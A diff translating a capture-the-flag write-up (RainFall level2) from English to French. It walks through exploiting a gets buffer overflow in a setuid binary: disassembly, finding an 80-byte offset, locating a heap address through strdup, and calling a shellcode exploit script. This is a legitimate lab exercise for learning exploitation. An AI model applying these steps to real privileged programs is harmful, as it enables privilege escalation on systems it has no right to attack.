@@ -1,10 +1,10 @@
-We have a binary with the setuid flag
+On a un binaire avec le flag setuid
 ```
 level2@RainFall:~$ ls -l
 total 8
 -rwsr-s---+ 1 level3 users 5403 Mar  6  2016 level2
 ```
-We disassemble:
+On désassemble
 ```asm
 level2@RainFall:~$ objdump -d intel  ./level2 -M intel
 080484d4 <p>:
@@ -51,18 +51,18 @@ level2@RainFall:~$ objdump -d intel  ./level2 -M intel
  804854e:	90                   	nop
  804854f:	90                   	nop
 ```
-We notice call to gets, puts and strdup. p function is of interest. It is called by main and uses gets function that we know is vulnerable to buffer overflow attack.
-However, it seems there is a check here:
+On remarque l'appel à **fflush**, **gets**, **puts** et **strdup**. La fonction p est intéressante. Elle est appelé par main et utilise la fonction gets dont nous savons qu'elle est vulnérable aux attaques buffer overflow.
+Cependant il y a un contrôle:
 ```asm
  80484f8:	8b 45 f4             	mov    eax,DWORD PTR [ebp-0xc]
  80484fb:	25 00 00 00 b0       	and    eax,0xb0000000
  8048500:	3d 00 00 00 b0       	cmp    eax,0xb0000000
  8048505:	75 20                	jne    8048527 <p+0x53>
 ```
-It seems to check if eax contains an address that belongs to the range 0xb0000000 - 0xbfffffff which is the range of Kernel or Stack addresses.
-Since there are no hidden function with call to system like level1, we will have to inject our own.
-First we will try to hijack the eax return register to exploit gets vulnerability. The return address will be the buffer of gets and the buffer will contain shellcode.
-We use the same tactic as level1 to determine the offset:
+Il semble vérifier si **eax** contient une adresse appartenant à la plage 0xb0000000 - 0xbfffffff, qui correspond à la plage des adresses du Kernel ou de la Stack.
+Étant donné qu'il n'y a pas de fonction cachée avec un appel à **system** comme dans **level1**, nous devrons injecter la nôtre.
+Nous allons d'abord essayer de détourner le registre de retour **eax** pour exploiter la vulnérabilité de **gets**. L'adresse de retour sera celle du buffer de **gets**, et le buffer contiendra du **shellcode**.
+Nous utilisons la même tactique que pour **level1** afin de déterminer l'offset :
 ```
 level2@RainFall:~$ python /tmp/pattern3.py
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
@@ -109,7 +109,7 @@ level2@RainFall:~$ python /tmp/pattern3.py > /tmp/2.txt
 level2@RainFall:~$ python /tmp/pattern3.py /tmp/2.txt 0x37634136
 offset found at: 80
 ```
-We find an offset at 80 bytes. Lets try to inject shell code to the return address:
+On a trouvé un offset à 80 octets. Essayons d'injecter le **shelcode** à l'adresse de retour:
 ```
 level2@RainFall:~$ gdb -q ./level2
 Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
@@ -160,7 +160,7 @@ Dump of assembler code for function p:
    0x0804853e <+106>:   ret
 End of assembler dump.
 ```
-we want the return buffer so we place a bp right after the call to gets: 0x080484f2
+On veut le buffer de retour, donc on met un break point après l'appel a **gets**: 0x080484f2 
 ```
 (gdb) b *0x080484f2
 Breakpoint 3 at 0x80484f2
@@ -200,7 +200,7 @@ level2@RainFall:~$ cat /tmp/payload_level2 - | ./level2
 (0xbffff6dc)
 
 ```
-it failed because we cant write on stack, but on heap it seems to be ok. strdup returns the following address:
+Cela a échoué parce que nous ne pouvons pas écrire sur la Stack, mais sur la Heap, cela semble fonctionner. strdup renvoie l'adresse suivante :
 ```
 level2@RainFall:~$ ltrace ./level2
 __libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
@@ -214,7 +214,7 @@ TEST!
 strdup("TEST!")                          = 0x0804a008
 +++ exited (status 8) +++
 ```
-We try again with this malloc'ed address:
+Nous réessayons avec cette adresse allouée par **malloc**:
 ```
 level2@RainFall:~$ python /tmp/exploit3.py  0x0804a008 59
 crafting payload...
